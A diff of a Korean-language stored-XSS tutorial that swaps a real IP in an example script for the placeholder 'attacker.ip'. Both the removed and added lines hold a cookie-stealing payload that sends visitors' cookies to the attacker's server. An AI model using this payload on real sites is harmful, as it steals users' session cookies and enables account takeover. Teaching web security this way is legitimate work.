@@ -21,7 +21,7 @@
  
  ![xss_stored](https://github.com/Tree1st/HK/blob/master/webH/image/xss/xss_stored.png)
  
- 게시글에 다음과같이 입력합니다.`<script>document.location="http://112.149.131.31/?"+document.cookie;</script>` 해당 스크립트는 이 글을 접속하는 유저의 쿠키와 함께 공격자의 서버로 redirect 시킵니다.
+ 게시글에 다음과같이 입력합니다.`<script>document.location="http://attacker.ip/?"+document.cookie;</script>` 해당 스크립트는 이 글을 접속하는 유저의 쿠키와 함께 공격자의 서버로 redirect 시킵니다.
  
  ![xss_stored2](https://github.com/Tree1st/HK/blob/master/webH/image/xss/xss_stored2.png)
  
